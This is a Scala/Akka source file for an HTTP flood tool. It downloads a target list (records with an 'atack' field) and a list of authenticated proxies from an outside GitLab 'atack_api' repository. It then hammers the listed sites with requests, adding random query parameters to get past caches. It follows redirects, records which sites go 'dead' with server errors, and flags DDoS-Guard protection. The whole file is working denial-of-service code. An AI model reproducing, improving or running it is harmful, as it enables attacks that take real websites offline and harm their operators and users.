package hi

import akka.actor.ActorSystem
import upickle.default._
import akka.http.scaladsl.Http
import akka.http.scaladsl.model._
import akka.stream.OverflowStrategy
import akka.stream.scaladsl.{Flow, Sink, Source}
import akka.util.ByteString

import java.io.{BufferedWriter, File, FileWriter}
import scala.collection.mutable
import scala.concurrent.duration.DurationInt
import scala.concurrent.{ExecutionContextExecutor, Future}
import scala.util.Random

object Main {
  case class Proxy(id: Int, ip: String, auth: String) {
    val getIp = ip.replace("\r", "").split(":").head
    val port = ip.replace("\r", "").split(":")(1)
    val login = auth.split(":").head
    val password = auth.split(":")(1)
  }

  implicit val proxyRW: ReadWriter[Proxy] = macroRW

  var proxies = fetchProxies

  case class Target(id: Int, url: String, need_parse_url: Int, page: String, page_time: String, atack: Int)

  implicit val targetRW: ReadWriter[Target] = macroRW

  val REFRESH_TIME = 10 * 60 * 1000
  val FAILURES_PATH = "failures"

  var file = List()

  var lastUpdate = System.currentTimeMillis()

  def main(args: Array[String]): Unit = {
    clearFailures()

    implicit val system: ActorSystem = ActorSystem()
    implicit val executionContext: ExecutionContextExecutor = system.dispatcher

    val ddosGuardUrls = mutable.HashSet[String]()

    val (queue, aggregationSource) = Source
      .queue[String](1, OverflowStrategy.backpressure)
      .throttle(20, 1.second)
      .preMaterialize()

    val updateList = Source(fetchTargets.filter(_.atack > 0).map(_.page))
      .throttle(400, 5.minute)

    val proxyList = Source(fetchProxies)
      .throttle(400, 20.minute)

    val redirection = Flow
      .fromFunction[String, (String, Future[HttpResponse])](f => {
        (f, Http().singleRequest(HttpRequest(uri = randomQueryParam(f.replace(" ", "")))))
      })
      .to(Sink
        .foreach(r => r._2.map({
          case HttpResponse(StatusCodes.Redirection(intValue), headers, _, _) =>
            println(s"redirect $intValue, $headers")
            val link = headers.filter(ss => ss.name().equals("Location"))
            if (link.nonEmpty && link.head.value().startsWith("http"))
              queue.offer(link.head.value())
          case HttpResponse(StatusCodes.OK, _, _, _) =>
            println(s"${r._1} is working")
          case HttpResponse(StatusCodes.ServerError(intValue), _, _, _) =>
            println(s"${r._1} is dead by $intValue")
          case HttpResponse(StatusCodes.Forbidden, _, entity, _) =>
            ddosGuardUrls.add(r._1)
            println(s"${r._1} DDOS-GUARD")
          case HttpResponse(status, _, entity, _) =>
            entity.dataBytes.runFold(ByteString(""))(_ ++ _).foreach { body =>
              toFile(status.intValue() + "-" + r._1, body.utf8String)

              println(s"${r._1} ${status.intValue()} unknown error")
            }
        })))
    Source(file)
      .via(
        Flow[String]
          .merge(aggregationSource)
          .merge(updateList)
          .wireTap(redirection)
          .map(p => queue.offer(p))
      )
      .run()
  }

  /*  private def fetchUrls = {
      val source = scala.io.Source.fromURL("https://raw.githubusercontent.com/david-l-books/storage/main/urls.txt")
      try {
        source.getLines.toList
      } finally {
        source.close()
      }
    }*/

  private def fetchProxies(implicit proxyRW: ReadWriter[Proxy]): List[Proxy] = {
    val source = scala.io.Source.fromURL("https://gitlab.com/cto.endel/atack_api/-/raw/master/proxy.json")
    try {
      read[List[Proxy]](source.toList.mkString)
    } finally {
      source.close()
    }
  }

  private def fetchTargets(implicit targetRW: ReadWriter[Target]): List[Target] = {
    val source = scala.io.Source.fromURL("https://gitlab.com/cto.endel/atack_api/-/raw/master/sites.json")
    try {
      read[List[Target]](source.toList.mkString)
    } finally {
      source.close()
    }
  }

  def clearFailures() = {
    new File(FAILURES_PATH)
      .listFiles((_, fileName) => fileName != ".gitkeep")
      .foreach(_.delete())
  }

  def toFile(name: String, content: String) = {
    val file = new File(FAILURES_PATH + "/" + name
      .replaceAll(":", "")
      .replaceAll("/", "")
      .replaceAll("\\?", "")
      .replaceAll("#", "") + ".html")
    val bw = new BufferedWriter(new FileWriter(file))
    bw.write(content)
    bw.close()
  }

  def randomQueryParam(url: String) = {
    val queryParam = Random.alphanumeric.take(10).mkString + "=" + Random.alphanumeric.take(12).mkString
    if (url.contains("?")) url + "&" + queryParam else url + "?" + queryParam
  }
}